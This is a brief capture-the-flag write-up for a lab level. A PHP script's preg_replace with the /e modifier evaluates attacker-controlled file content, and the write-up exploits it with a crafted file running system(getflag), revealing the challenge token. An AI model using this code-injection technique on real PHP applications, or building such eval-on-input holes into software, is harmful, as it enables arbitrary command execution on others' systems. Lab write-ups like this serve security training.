# level06

```bash
~$ ls
level06  level06.php
```

`level06` is an executable, it does some uid & gid magic, then launches `level06.php`.

`level06.php`:

```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

> Setting the e regex modifier will cause PHP to execute the replacement value as code

```bash
~$ echo "[x system(getflag)]" > /tmp/file
~$ ./level06 /tmp/file
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
